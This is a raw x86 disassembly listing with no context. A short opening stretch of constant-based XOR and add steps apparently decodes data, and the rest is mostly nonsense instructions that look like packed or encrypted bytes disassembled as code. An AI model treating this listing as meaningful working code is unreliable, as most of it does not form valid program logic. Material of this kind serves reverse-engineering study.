  409b39:	mov    edx,DWORD PTR [edx+0x5a8a4004]
  409b3f:	mov    ebp,0x7a5d209d
  409b44:	jp     0x409ad6
  409b46:	or     DWORD PTR [edi],edx
  409b48:	ret    0xa3f9
  409b4b:	fist   WORD PTR [esi]
  409b4d:	mov    dl,cl
  409b4f:	pushf  
  409b50:	push   cs
  409b51:	inc    ebx
  409b52:	sub    DWORD PTR [ecx],ecx
  409b54:	xor    BYTE PTR [edi-0x1987b9b7],ch
  409b5a:	arpl   WORD PTR [edi-0x43],bp
  409b5d:	adc    eax,0x53ef139
  409b62:	mov    bh,0xd4
  409b64:	jmp    FWORD PTR [edi+0x4abdac27]
  409b6a:	ret    0x4589
  409b6d:	shr    BYTE PTR [ecx],0x15
  409b70:	add    DWORD PTR [ebp+0x43],0x0
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x4344df
  409b7f:	or     DWORD PTR ds:0x43454f,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x43457f
  409b8f:	xor    DWORD PTR ds:0x434583,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x43456b
  409bb7:	mov    edi,DWORD PTR ds:0x434623
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	(bad)  
  409bd5:	inc    eax
  409bd6:	jl     0x409b66
  409bd8:	jmp    0x7e7e:0x79707e7e
  409bdf:	lods   eax,DWORD PTR ds:[esi]
  409be0:	scas   eax,DWORD PTR es:[edi]
  409be1:	fwait
  409be2:	test   eax,0xf6497153
  409be7:	push   es
  409be8:	jmp    0x4cb2c767
  409bed:	sub    DWORD PTR [edi-0x20],edx
  409bf0:	add    eax,DWORD PTR [esi]
  409bf2:	fld    QWORD PTR [ebx+eiz*2]
  409bf5:	mov    ebp,0x3d4885d7
  409bfa:	loopne 0x409c68
  409bfc:	das    
  409bfd:	popf   
  409bfe:	jns    0x409c2e
  409c00:	sbb    eax,0x4f2c0407
  409c05:	popa   
  409c06:	add    DWORD PTR [ecx-0x777b0682],edi
  409c0c:	ret    0x6a15
  409c0f:	inc    edi
  409c10:	daa    
  409c11:	repnz pop edx
  409c13:	jmp    0x57f4:0xaaceba90
  409c1a:	pop    ebx
  409c1b:	xor    ah,BYTE PTR [edx+0x78]
  409c1e:	mov    eax,0x79d310bc
  409c23:	jg     0x409c91
  409c25:	pop    edi
  409c26:	pop    ecx
  409c27:	inc    edx
  409c28:	inc    ebx
  409c29:	cs mov esi,0x5fa4d98b
  409c2f:	pop    ds
  409c30:	sti    
  409c31:	cdq    
  409c32:	xor    eax,edi
  409c34:	stos   BYTE PTR es:[edi],al
  409c35:	xor    al,cl
  409c37:	dec    edi
  409c38:	fimul  WORD PTR [eax]
  409c3a:	enter  0x1426,0xfa
  409c3e:	pop    ebx
  409c3f:	add    ch,dh
  409c41:	iret   
  409c42:	icebp  
  409c43:	sub    eax,0x16213ad4
  409c48:	xor    BYTE PTR [ebp+0x3730c9a6],bh
  409c4e:	or     DWORD PTR [edx+0x6a026a34],ecx
  409c54:	mov    ss:0x497f2762,eax
  409c5a:	pop    es
  409c5b:	fiadd  DWORD PTR [esi]
  409c5d:	push   ebp
  409c5e:	lds    esi,FWORD PTR [eax-0x2]
  409c61:	mov    al,ds:0x39880f83
  409c66:	mov    dl,0x2a
  409c68:	imul   esp,edi,0x68c07acc
  409c6e:	lock jg 0x409c1c
  409c71:	inc    esi
  409c72:	adc    ecx,DWORD PTR [esi]
  409c74:	rcr    BYTE PTR [eax],0xdd
  409c77:	mov    edi,0x1e76d331
  409c7c:	aaa    
  409c7d:	arpl   WORD PTR [ebx+0x1],bp
  409c80:	xchg   edx,eax
  409c81:	fldenv [edx+0xd6f59b9]
  409c87:	push   ebx
  409c88:	aam    0x9d
  409c8a:	repz pop eax
  409c8c:	mov    ah,0xfc
  409c8e:	iret   
  409c8f:	shl    DWORD PTR [ebx],1
  409c91:	pop    eax
  409c92:	add    ah,BYTE PTR [ebx-0x78]
  409c95:	pop    ss
  409c96:	(bad)  
  409c97:	xor    dh,BYTE PTR [ebx-0x7d78fbcf]
  409c9d:	mov    bh,0x58
  409c9f:	jnp    0x409cdb
  409ca1:	or     al,0x9b
  409ca3:	xor    al,0x9a
  409ca5:	xor    ah,ch
  409ca7:	outs   dx,DWORD PTR ds:[esi]
  409ca8:	inc    ch
  409caa:	aad    0x21
  409cac:	pop    ebx
  409cad:	xchg   ebx,eax
  409cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409caf:	arpl   bp,dx
  409cb1:	cmp    al,0x8c
  409cb3:	sub    dh,BYTE PTR [esi+esi*8]
  409cb6:	not    DWORD PTR [eax-0x8bde9c9]
  409cbc:	xchg   bl,ah
  409cbe:	mov    esi,0x13d9dedf
  409cc3:	jg     0x409c9c
  409cc5:	mov    edx,0x13337e45
  409cca:	push   DWORD PTR [edi-0x7a9cf4f2]
  409cd0:	and    dh,BYTE PTR [esi]
  409cd2:	xchg   esi,eax
  409cd3:	add    eax,0x8a429ec2
  409cd8:	les    edx,FWORD PTR [ebx]
  409cda:	fcom   st(4)
  409cdc:	sub    ah,BYTE PTR [ecx-0xefaa596]
  409ce2:	or     ebp,ecx
  409ce4:	jmp    0xd1c181dc
  409ce9:	lea    esp,[ebp-0x47]
  409cec:	sbb    al,0x6d
  409cee:	pop    esp
  409cef:	adc    al,0x70
  409cf1:	xchg   ebx,eax
  409cf2:	or     eax,0x93ea3b96
  409cf7:	aas    
  409cf8:	clc    
  409cf9:	xor    eax,0x6622370
  409cfe:	and    eax,0x556f5b33
  409d03:	lods   al,BYTE PTR ds:[esi]
  409d04:	inc    edi
  409d05:	and    DWORD PTR [ecx+0x7e289c7],ebx
  409d0b:	jne    0x409d89
  409d0d:	outs   dx,BYTE PTR ds:[esi]
  409d0e:	xchg   esp,eax
  409d0f:	ficomp DWORD PTR [eax-0x27]
  409d12:	or     DWORD PTR ds:0x4a508255,edi
  409d18:	test   BYTE PTR [edx+0x4465ae56],cl
  409d1e:	add    esi,0xd978f887
  409d24:	clc    
  409d25:	das    
  409d26:	push   ds
  409d27:	loop   0x409cb3
  409d29:	arpl   WORD PTR [ebp+0x63],di
  409d2c:	loope  0x409d3d
  409d2e:	icebp  
  409d2f:	ja     0x409cef
  409d31:	push   es
  409d32:	loop   0x409ce8
  409d34:	cwde   
  409d35:	stos   BYTE PTR es:[edi],al
  409d36:	mov    WORD PTR [ecx-0xb278bdb],ss
  409d3c:	ror    ah,1
  409d3e:	push   ecx
  409d3f:	sti    
  409d40:	shr    dh,cl
  409d42:	mov    ?,WORD PTR [edx-0x4f2dccd8]
  409d48:	jo     0x409d71
  409d4a:	add    al,0x56
  409d4c:	daa    
  409d4d:	cmp    esp,DWORD PTR [edi-0x8]
  409d50:	and    esi,esp
  409d52:	mov    dl,BYTE PTR [edx+0x2f926ccb]
  409d58:	iret   
  409d59:	xchg   ebp,eax
  409d5a:	test   ah,ch
  409d5c:	fild   DWORD PTR [edi-0x39e60fef]
  409d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d63:	int3   
  409d64:	pop    ss
  409d65:	cmp    eax,0x1bd58050
  409d6a:	fistp  WORD PTR ds:0x9f0762c0
  409d70:	inc    edi
  409d71:	into   
  409d72:	cmp    eax,0x8d501906
  409d77:	(bad)  
  409d79:	pop    esp
  409d7a:	add    al,0xb5
  409d7c:	inc    eax
  409d7d:	lea    edi,[ebx+0x34]
  409d80:	or     eax,0x3035dc71
  409d85:	sub    eax,0xc578d474
  409d8a:	test   DWORD PTR [esi],0xf138be4e
  409d90:	jns    0x409ddc
  409d92:	dec    eax
  409d93:	sbb    BYTE PTR [edi],al
  409d95:	in     al,dx
  409d96:	fdivr  st,st(5)
  409d98:	sbb    al,0x4a
  409d9a:	jle    0x409d67
  409d9c:	nop
  409d9d:	pop    ss
  409d9e:	popa   
  409d9f:	inc    ebp
  409da0:	iret   
  409da1:	lods   al,BYTE PTR ds:[esi]
  409da2:	jp     0x409de3
  409da4:	cmp    eax,0x52e2083
  409da9:	pushf  
  409daa:	lahf   
  409dab:	add    edx,edi
  409dad:	jle    0x409d72
  409daf:	outs   dx,BYTE PTR ds:[esi]
  409db0:	scas   eax,DWORD PTR es:[edi]
  409db1:	stc    
  409db2:	mov    ch,0xf3
  409db4:	xlat   BYTE PTR ds:[ebx]
  409db5:	mov    ah,0xc5
  409db7:	inc    ecx
  409db8:	ffree  st(7)
  409dba:	fimul  WORD PTR ss:[ebx+edx*1-0x41]
  409dbf:	aaa    
  409dc0:	xlat   BYTE PTR ds:[ebx]
  409dc1:	fidiv  WORD PTR [edi+0x5d]
  409dc4:	mov    bh,0xa3
  409dc6:	cmp    eax,DWORD PTR [ebx+0x63b6c85d]
  409dcc:	xchg   esp,eax
  409dcd:	and    eax,0x118898c
  409dd2:	push   ss
  409dd3:	scas   al,BYTE PTR es:[edi]
  409dd4:	add    al,0x90
  409dd6:	cmp    ch,BYTE PTR ds:0xa1e1cb07
  409ddc:	icebp  
  409ddd:	dec    ebp
  409dde:	ret    
  409ddf:	(bad)  
  409de0:	retf   
  409de1:	out    dx,al
  409de2:	and    eax,0xc568df44
  409de7:	xchg   ebp,eax
  409de8:	les    esi,FWORD PTR [edi+0x7b]
  409deb:	and    eax,0x1bb1c2db
  409df0:	pop    ebx
  409df1:	aad    0x2d
  409df3:	idiv   DWORD PTR [ecx+0x177784ab]
  409df9:	dec    edx
  409dfa:	mov    eax,0xd4f0af5
  409dff:	push   es
  409e00:	add    edi,DWORD PTR [esi+0x4918e14d]
  409e06:	pop    ebx
  409e07:	fdiv   QWORD PTR [esi+0x3]
  409e0a:	(bad)  
  409e0b:	jmp    0x4e88:0x3b6953b2
  409e12:	scas   al,BYTE PTR es:[edi]
  409e13:	xchg   edi,eax
  409e14:	fisub  DWORD PTR [esi+edi*8+0x18]
  409e18:	cdq    
  409e19:	repz or ebx,DWORD PTR [edi-0x2b]
  409e1d:	mov    ds:0xfe005b53,eax
  409e22:	int3   
  409e23:	xor    eax,0x7380a68c
  409e28:	jp     0x409e79
  409e2a:	jmp    0x409dc6
  409e2c:	or     esi,ecx
  409e2e:	shl    DWORD PTR [edi-0x273e3b06],0x3b
  409e35:	sahf   
  409e36:	neg    BYTE PTR [edi+0x4092274a]
  409e3c:	stos   DWORD PTR es:[edi],eax
  409e3d:	test   al,0x7f
  409e3f:	in     al,0xfd
  409e41:	leave  
  409e42:	dec    dh
  409e44:	jp     0x409e93
  409e46:	iret   
  409e47:	pop    es
  409e48:	rol    ah,0xf5
  409e4b:	jp     0x409dd8
  409e4d:	pop    ds
  409e4e:	sbb    BYTE PTR [ecx],ch
  409e50:	cli    
  409e51:	(bad)  
  409e52:	call   0xae0c:0x7033f363
  409e59:	(bad)  
  409e5a:	neg    BYTE PTR [ebx+esi*2]
  409e5d:	mov    esi,0x6eab53e0
  409e62:	pop    esp
  409e63:	mov    WORD PTR [ebp-0x5b4df5f4],es
  409e69:	dec    ebx
  409e6a:	lgs    eax,FWORD PTR [ecx+0x1e]
  409e6e:	cs sub eax,0x394a9e7f
  409e74:	adc    DWORD PTR [eax-0x55b27cab],ebp
  409e7a:	mov    esi,0xead55e81
  409e80:	pop    eax
  409e81:	xchg   BYTE PTR [edx],ah
  409e83:	sbb    eax,0x23db5f58
  409e89:	mov    ?,WORD PTR [esi-0x54]
  409e8c:	push   ebp
  409e8d:	in     al,0xa9
  409e8f:	push   edx
  409e90:	ins    DWORD PTR es:[edi],dx
  409e91:	dec    ebx
  409e92:	test   ah,dl
  409e94:	imul   ecx,DWORD PTR [edi],0xffffffe8
  409e97:	icebp  
  409e98:	cmp    al,0x89
  409e9a:	into   
  409e9b:	pop    edi
  409e9c:	(bad)  
  409e9d:	rol    DWORD PTR [edx],1
  409e9f:	repnz test edi,esp
  409ea2:	adc    DWORD PTR [esi],ebx
  409ea4:	sbb    ebx,DWORD PTR [ebx+0x35]
  409ea7:	cli    
  409ea8:	push   edi
  409ea9:	je     0x409e48
  409eab:	pop    ebp
  409eac:	outs   dx,BYTE PTR ds:[esi]
  409ead:	mov    ch,0x27
  409eaf:	ja     0x409ef7
  409eb1:	xchg   ebp,eax
  409eb2:	sub    edx,DWORD PTR [eax]
  409eb4:	add    DWORD PTR [ecx],esp
  409eb6:	std    
  409eb7:	ficom  WORD PTR [ebx-0x17e060c]
  409ebd:	(bad)  
  409ebe:	cmp    ch,BYTE PTR [ecx-0x48]
  409ec1:	xchg   ebp,eax
  409ec2:	inc    ebp
  409ec3:	jg     0x409f1f
  409ec5:	(bad)  
  409ec6:	(bad)  
  409ec7:	into   
  409ec8:	ret    0xbdbf
  409ecb:	add    eax,eax
  409ecd:	ja     0x409e57
  409ecf:	and    ah,cl
  409ed1:	jp     0x409ece
  409ed3:	sbb    edx,DWORD PTR [ebp-0x50]
  409ed6:	mov    ?,WORD PTR [ebx-0x51098c30]
  409edc:	mov    ds:0xecb1eff9,al
  409ee1:	jne    0x409ee3
  409ee3:	into   
  409ee4:	pop    ebp
  409ee5:	push   edx
  409ee6:	xor    al,al
  409ee8:	cmp    ebx,0xffffffd5
  409eeb:	fdiv   st(5),st
  409eed:	xchg   edx,eax
  409eee:	mov    esi,0x73a51f96
  409ef3:	add    ebx,DWORD PTR [edx]
  409ef5:	pusha  
  409ef6:	dec    ebx
  409ef7:	xor    BYTE PTR [ebx+eax*1-0x6e],bh
  409efb:	push   eax
  409efc:	or     eax,0xeaca3be5
  409f01:	push   es
  409f02:	and    al,0x72
  409f04:	cmp    eax,0x834b95ed
  409f09:	jmp    0x569fb0c0
  409f0e:	mov    ch,BYTE PTR [esi-0x39]
  409f11:	xchg   edx,eax
  409f12:	fmul   DWORD PTR [ecx-0x2e]
  409f15:	stos   DWORD PTR es:[edi],eax
  409f16:	in     al,0x69
  409f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f19:	ds loope 0x409f0f
  409f1c:	popa   
  409f1d:	xor    al,0xa8
  409f1f:	mov    ds:0x30122816,al
  409f24:	adc    al,0xe1
  409f26:	scas   eax,DWORD PTR es:[edi]
  409f27:	mov    eax,0x11bcf6de
  409f2c:	or     ecx,ecx
  409f2e:	mov    al,0x22
  409f30:	into   
  409f31:	cs aam 0x46
  409f34:	cli    
  409f35:	das    
  409f36:	loopne 0x409ebd
  409f38:	pop    edi
  409f39:	inc    edi
  409f3a:	xchg   ebp,eax
  409f3b:	(bad)  
  409f3c:	dec    esi
  409f3d:	les    eax,FWORD PTR [ebx-0x30]
  409f40:	jno    0x409fc0
  409f42:	mov    esi,0x61e157c3
  409f47:	in     eax,dx
  409f48:	jp     0x409f89
  409f4a:	inc    esp
  409f4b:	sbb    eax,0xd994d9ca
  409f50:	xor    DWORD PTR ds:0xcd875975,esp
  409f56:	aad    0x99
  409f58:	bound  ecx,QWORD PTR [edx+0x436070af]
  409f5e:	mov    ds:0xa820d6d6,eax
  409f63:	push   DWORD PTR [ebp-0xb]
  409f66:	xor    DWORD PTR [ebp+0x6e9f7d63],edi
  409f6c:	push   0xffffffce
  409f6e:	pushf  
  409f6f:	mov    dh,0xff
  409f71:	adc    esi,DWORD PTR [ebx]
  409f73:	and    eax,0x27f2c09c
  409f78:	jb     0x409f40
  409f7a:	adc    bh,cl
  409f7c:	cmp    DWORD PTR [ecx-0x49],0x515b06ce
  409f83:	adc    DWORD PTR [esi+0xa],edx
  409f86:	lods   al,BYTE PTR ds:[esi]
  409f87:	jne    0x40a005
  409f89:	gs test eax,0x81d9e954
  409f8f:	xor    ebx,edx
  409f91:	es pop esp
  409f93:	jae    0x409f63
  409f95:	push   es
  409f96:	es sahf 
  409f98:	iret   
  409f99:	out    0x17,al
  409f9b:	pop    ds
  409f9c:	sub    al,0x45
  409f9e:	push   ebp
  409f9f:	xor    al,0x74
  409fa1:	mov    eax,ds:0x76309e60
  409fa6:	mov    dl,0xff
  409fa8:	pop    ss
  409fa9:	sbb    edx,DWORD PTR [edi]
  409fab:	inc    ebx
  409fac:	stos   DWORD PTR es:[edi],eax
  409fad:	cmp    al,0x80
  409faf:	popf   
  409fb0:	fist   WORD PTR [edi-0x5afa9043]
  409fb6:	mov    ah,0xfb
  409fb8:	mov    ebp,0x73085fce
  409fbd:	test   eax,0xb9e95247
  409fc2:	test   BYTE PTR [esi],ah
  409fc4:	aad    0x0
  409fc6:	icebp  
  409fc7:	inc    ebx
  409fc8:	mov    WORD PTR [edx+0x4e],ds
  409fcb:	jecxz  0x409fc8
  409fcd:	xchg   esi,eax
  409fce:	bound  esp,QWORD PTR [ecx-0x6b1e1eab]
  409fd4:	rol    BYTE PTR [ebx-0x1d],0x1b
  409fd8:	inc    eax
  409fd9:	mov    DWORD PTR [ebp-0x28],0xf89c8538
  409fe0:	and    edi,edi
  409fe2:	jmp    0x40a3f9
  409fe7:	popa   
  409fe8:	imul   ebp,esp,0xffffff8d
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fldcw  WORD PTR [esi]
  409ff4:	or     DWORD PTR [eax],ecx
  409ff6:	les    eax,FWORD PTR [eax+0x707e7ef6]
  409ffc:	jns    0x40a07c
  409ffe:	jle    0x40a03d
  40a000:	xor    edx,DWORD PTR [esi-0x12905964]
  40a006:	sub    BYTE PTR [eax],al
  40a008:	jmp    0x861d43ff
  40a00d:	loopne 0x40a050
  40a00f:	xchg   esp,eax
  40a010:	add    dh,BYTE PTR [ecx-0x1d]
  40a013:	mov    eax,ds:0xa7e19ec8
  40a018:	inc    esi
  40a019:	mov    al,0x82
  40a01b:	adc    BYTE PTR [ebx-0x4b],dh
  40a01e:	jbe    0x409fbe
  40a020:	add    BYTE PTR ds:0x7b045921,dh
  40a026:	or     dh,BYTE PTR [eax]
  40a028:	and    eax,0x49738d8b
  40a02d:	(bad)  
  40a02e:	pop    es
  40a02f:	cmc    
  40a030:	push   0xffffff88
  40a032:	out    0x59,al
  40a034:	lods   al,BYTE PTR ds:[esi]
  40a035:	or     ecx,DWORD PTR [ebp-0x18]
  40a038:	into   
  40a039:	test   DWORD PTR [eax],0x1906bd5c
  40a03f:	ror    bh,cl
  40a041:	and    al,0x32
  40a043:	sub    al,0x1a
  40a045:	call   0x7d76:0x3e3d9880
  40a04c:	xor    eax,0x691b270d
  40a051:	inc    eax
  40a052:	imul   edx,edx,0x7e
  40a055:	(bad)  
  40a056:	popa   
  40a057:	push   ebp
  40a058:	xchg   BYTE PTR ds:0xe8b6da25,cl
  40a05e:	hlt    
  40a05f:	test   al,0x15
  40a061:	outs   dx,BYTE PTR ds:[esi]
  40a062:	out    dx,al
  40a063:	mov    eax,ds:0xbc48e649
  40a068:	jg     0x40a035
  40a06a:	sbb    eax,0xba577c54
  40a06f:	mov    edi,0xcc631771
  40a074:	sahf   
  40a075:	jp     0x40a0eb
  40a077:	mov    ds:0x269298b4,eax
  40a07c:	nop
  40a07d:	loop   0x40a0fc
  40a07f:	fbld   TBYTE PTR [ebx+0x30]
  40a082:	add    bl,BYTE PTR [ebp-0x44a2e56f]
  40a088:	cmp    eax,DWORD PTR [edx+0x2c57550a]
  40a08e:	xchg   ecx,eax
  40a08f:	mov    eax,ds:0x5b134839
  40a094:	push   es
  40a095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a096:	pop    eax
  40a097:	jns    0x40a0bc
  40a099:	jnp    0x40a0e2
  40a09b:	mov    BYTE PTR [eax],0x65
  40a09e:	test   al,0xff
  40a0a0:	adc    DWORD PTR [edi+0x3c],0x5ab1c823
  40a0a7:	dec    esp
  40a0a8:	add    eax,0x98cea13b
  40a0ad:	jo     0x40a072
  40a0af:	in     eax,0xc1
  40a0b1:	ror    ch,1
  40a0b3:	ficomp DWORD PTR [ecx+0x1c]
  40a0b6:	add    DWORD PTR [edi],ecx
  40a0b8:	fistp  DWORD PTR [edx-0x52fe3d98]
  40a0be:	pop    edi
  40a0bf:	sub    edi,0x56
  40a0c2:	jge    0x40a049
  40a0c4:	mov    dl,0x98
  40a0c6:	mov    ds:0x313c8308,eax
  40a0cb:	mov    cl,0x73
  40a0cd:	adc    ebx,DWORD PTR es:[eax]
  40a0d0:	adc    DWORD PTR [eax+0x46],edx
  40a0d3:	xor    eax,0x1dbe2977
  40a0d8:	into   
  40a0d9:	in     al,0x33
  40a0db:	mov    al,ds:0xc989f97f
  40a0e0:	mov    ds:0xba0301ce,eax
  40a0e5:	sub    DWORD PTR [ebp+0x77],0x7e5f1677
  40a0ec:	out    0x4e,al
  40a0ee:	(bad)  
  40a0ef:	mov    ds:0x74af2e03,eax
  40a0f4:	mov    eax,0x41c04dd2
  40a0f9:	mov    ch,0x2f
  40a0fb:	jle    0x40a159
  40a0fd:	(bad)  
  40a0fe:	ins    DWORD PTR es:[edi],dx
  40a0ff:	jno    0x40a0da
  40a101:	sbb    BYTE PTR [ebx-0x7d],cl
  40a104:	loop   0x40a0e8
  40a106:	arpl   WORD PTR [ebp-0x3d1b7ba4],di
  40a10c:	lods   al,BYTE PTR ds:[esi]
  40a10d:	fist   DWORD PTR [ebx]
  40a10f:	push   ds
  40a110:	xchg   esi,eax
  40a111:	ss sub al,0x57
  40a114:	mov    esi,0x9e8285b4
  40a119:	icebp  
  40a11a:	das    
  40a11b:	test   esp,ebp
  40a11d:	dec    esp
  40a11e:	jo     0x40a0d5
  40a120:	cmp    DWORD PTR [eax+0x32bc4c61],0xd5945184
  40a12a:	push   ebp
  40a12b:	mov    bl,0xae
  40a12d:	push   0x9b81fe50
  40a132:	jle    0x40a126
  40a134:	pop    esi
  40a135:	or     eax,0x1d144b5d
  40a13a:	maskmovq mm4,(bad)
  40a13b:	mul    DWORD PTR [ebp+eiz*2+0x23fba303]
  40a142:	adc    DWORD PTR [ecx-0x3f5e50cc],0x82822c94
  40a14c:	push   edi
  40a14d:	cmp    ebp,DWORD PTR [edi-0x6c013218]
  40a153:	sbb    BYTE PTR [esi-0x5657d6f],dh
  40a159:	ins    DWORD PTR es:[edi],dx
  40a15a:	mov    DWORD PTR [edi],esi
  40a15c:	in     al,0xeb
  40a15e:	jmp    0x4c1c:0x2c7d81cb
  40a165:	outs   dx,DWORD PTR ds:[esi]
  40a166:	push   cs
  40a167:	stos   DWORD PTR es:[edi],eax
  40a168:	ret    0xcb7b
  40a16b:	add    eax,0xbe03cf2
  40a170:	into   
  40a171:	shr    BYTE PTR [esi+0x63],cl
  40a174:	dec    esp
  40a175:	add    al,0x82
  40a177:	mov    bh,0xfc
  40a179:	mov    bl,0xa3
  40a17b:	push   0xffffffea
  40a17d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a17e:	mov    cl,0x2f
  40a180:	es sub al,0x9e
  40a183:	(bad)  
  40a184:	pop    ds
  40a185:	loop   0x40a12b
  40a187:	xor    DWORD PTR [ecx+0x4b7ed9c8],0x15
  40a18e:	add    ch,BYTE PTR [esi+0x78]
  40a191:	mov    eax,0x5ba256a4
  40a196:	adc    esi,DWORD PTR [edi-0x77]
  40a199:	jl     0x40a1d8
  40a19b:	xchg   ebx,eax
  40a19c:	jmp    0x55a257f4
  40a1a1:	adc    dl,bl
  40a1a3:	int3   
  40a1a4:	loopne 0x40a212
  40a1a6:	imul   esi,edx,0x7c
  40a1a9:	pop    es
  40a1aa:	out    0xac,al
  40a1ac:	jg     0x40a138
  40a1ae:	mov    cl,0x2c
  40a1b0:	cld    
  40a1b1:	enter  0x36ff,0xb5
  40a1b5:	pop    esi
  40a1b6:	push   ebp
  40a1b7:	add    ebp,DWORD PTR [esp+esi*4]
  40a1ba:	add    al,0x43
  40a1bc:	in     eax,0xd5
  40a1be:	jle    0x40a22e
  40a1c0:	into   
  40a1c1:	lds    ebx,FWORD PTR [edi+esi*4+0x64ce29a6]
  40a1c8:	outs   dx,DWORD PTR ds:[esi]
  40a1c9:	ss stc 
  40a1cb:	scas   al,BYTE PTR es:[edi]
  40a1cc:	stos   BYTE PTR es:[edi],al
  40a1cd:	aam    0xa6
  40a1cf:	aas    
  40a1d0:	sbb    al,0xeb
  40a1d2:	mov    ebp,0x94af85bf
  40a1d7:	inc    eax
  40a1d8:	(bad)  
  40a1d9:	ss jecxz 0x40a1b9
  40a1dc:	add    eax,0xb627a426
  40a1e1:	dec    ecx
  40a1e2:	shr    BYTE PTR [ecx+0x6f6b31ac],cl
  40a1e8:	in     al,dx
  40a1e9:	mov    eax,esi
  40a1eb:	or     edi,0x64
  40a1ee:	mov    bl,0xc9
  40a1f0:	imul   esp,DWORD PTR [eax+0x6e],0xffffffa9
  40a1f4:	jns    0x40a1cd
  40a1f6:	jae    0x40a1ae
  40a1f8:	int3   
  40a1f9:	sub    BYTE PTR [eax],bl
  40a1fb:	iret   
  40a1fc:	push   esp
  40a1fd:	and    ah,BYTE PTR [eax]
  40a1ff:	fst    DWORD PTR [bp+di+0x7b7]
  40a204:	jmp    0x40a1ca
  40a206:	test   eax,0x28a938fe
  40a20b:	xchg   ebx,eax
  40a20c:	mov    edi,0x743c3bb4
  40a211:	mov    ?,ecx
  40a213:	(bad)  
  40a214:	xor    ah,bl
  40a216:	(bad)  
  40a218:	pusha  
  40a219:	mov    al,ds:0x70f93df1
  40a21e:	(bad)  
  40a21f:	add    ax,0x5f7d
  40a223:	in     al,0x69
  40a225:	jle    0x40a1d9
  40a227:	pop    ebp
  40a228:	rol    DWORD PTR [ecx+edi*2],cl
  40a22b:	addr16 add eax,0x10a29d3c
  40a231:	loope  0x40a254
  40a233:	les    ecx,FWORD PTR [edx]
  40a235:	js     0x40a1fa
  40a237:	add    bh,dl
  40a239:	xor    ah,BYTE PTR [edi]
  40a23b:	pop    ds
  40a23c:	pusha  
  40a23d:	(bad)  
  40a23e:	loopne 0x40a2b3
  40a240:	fisubr WORD PTR [eax-0x324037a7]
  40a246:	cdq    
  40a247:	mov    esi,DWORD PTR [esi]
  40a249:	adc    BYTE PTR [ebx],al
  40a24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a24c:	or     al,0x20
  40a24e:	mov    ch,0xe9
  40a250:	in     eax,dx
  40a251:	xchg   esp,ecx
  40a253:	sub    BYTE PTR [esi-0x49],dl
  40a256:	int3   
  40a257:	inc    esi
  40a258:	xlat   BYTE PTR ds:[ebx]
  40a259:	sub    BYTE PTR [edx+0x6235bcf8],al
  40a25f:	ds aas 
  40a261:	pop    es
  40a262:	sti    
  40a263:	mov    BYTE PTR [eax],dl
  40a265:	sti    
  40a266:	ret    
  40a267:	fcomp  DWORD PTR [ecx-0x2c]
  40a26a:	retf   
  40a26b:	xchg   ecx,eax
  40a26c:	or     edi,DWORD PTR [edx]
  40a26e:	ss jb  0x40a2c7
  40a271:	push   es
  40a272:	jbe    0x40a280
  40a274:	gs jno 0x40a28d
  40a277:	mov    bl,0xf3
  40a279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a27a:	add    bh,dl
  40a27c:	fldcw  WORD PTR [esi+0x75]
  40a27f:	lahf   
  40a280:	(bad)  
  40a282:	mov    dh,0x45
  40a284:	fwait
  40a285:	xor    eax,0x2bbaabe4
  40a28a:	sub    eax,0x6b17b36d
  40a28f:	xchg   ebx,eax
  40a290:	rcl    DWORD PTR [esi+0x41],0x99
  40a294:	fwait
  40a295:	bswap  esp
  40a297:	jl     0x40a231
  40a299:	cld    
  40a29a:	adc    dh,BYTE PTR [edx+0x3f31e21]
  40a2a0:	sbb    BYTE PTR [eax],cl
  40a2a2:	inc    ecx
  40a2a3:	mov    ch,BYTE PTR [edi+0x61]
  40a2a6:	(bad)  
  40a2a8:	data16 jge 0x40a29e
  40a2ab:	jg     0x40a2b8
  40a2ad:	adc    ch,BYTE PTR [ebx-0x317102f1]
  40a2b3:	idiv   BYTE PTR [edi]
  40a2b5:	mov    eax,ds:0x92472c4b
  40a2ba:	sub    ebx,DWORD PTR ds:0x6e7060f
  40a2c0:	add    edx,DWORD PTR [eax]
  40a2c2:	mov    ch,0xd9
  40a2c4:	rol    BYTE PTR [ecx-0x4e063269],cl
  40a2ca:	jmp    0x40a342
  40a2cc:	mov    al,ds:0xe16560be
  40a2d1:	mov    eax,0xa215fadd
  40a2d6:	pop    ebp
  40a2d7:	adc    eax,0x65b6b3c3
  40a2dc:	or     ebx,esp
  40a2de:	add    al,0x5c
  40a2e0:	mov    bh,0xab
  40a2e2:	aaa    
  40a2e3:	jno    0x40a352
  40a2e5:	mov    WORD PTR [edi],fs
  40a2e7:	or     cl,dl
  40a2e9:	adc    BYTE PTR [ebx],0x8e
  40a2ec:	addr16 retf 0x17e
  40a2f0:	(bad)  
  40a2f1:	scas   al,BYTE PTR es:[edi]
  40a2f2:	bound  ebp,QWORD PTR [ebx]
  40a2f4:	test   DWORD PTR [ebx+0x70],esp
  40a2f7:	mov    ebp,0xb12d841d
  40a2fc:	(bad)  
  40a2fe:	and    al,0xa1
  40a300:	dec    ecx
  40a301:	retf   
